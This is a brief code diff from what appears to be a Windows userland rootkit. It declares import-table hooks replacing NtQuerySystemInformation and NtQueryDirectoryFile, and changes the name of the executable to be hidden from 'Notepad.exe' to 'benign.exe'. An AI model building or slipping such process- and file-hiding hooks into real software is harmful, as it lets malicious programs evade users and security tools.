@@ -21,7 +21,7 @@ PIMAGE_IMPORT_BY_NAME pImportByNameIAT;
 MEMORY_BASIC_INFORMATION mbi;
 
 BYTE* p_original_func;
-const wchar_t* to_hide = L"Notepad.exe";
+const wchar_t* to_hide = L"benign.exe";
 
 NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
 NTSTATUS MyNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);
